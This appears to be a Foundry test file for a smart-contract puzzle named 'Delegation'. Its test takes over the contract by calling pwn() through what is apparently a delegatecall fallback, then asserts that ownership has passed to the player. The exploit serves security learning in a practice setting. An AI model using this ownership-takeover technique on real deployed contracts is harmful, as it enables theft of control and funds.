// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Delegation} from "src/Challenge6-delegation/Puzzle.sol";

contract Challenge6Test is Test {
    Delegation public puzzle;
    address player = makeAddr("player");

    /// @dev Setup the testing environment.
    function setUp() public {
        puzzle = new Delegation();
    }

    function testSimpleHack() public {
        assertEq(puzzle.owner(), address(this));
        vm.startPrank(player,player);
        address(puzzle).call(abi.encodeWithSignature("pwn()"));
        vm.stopPrank();
        assertEq(puzzle.owner(), player);
    }


    function testHackHuff() public {
        // no contract needed
    }
    
}
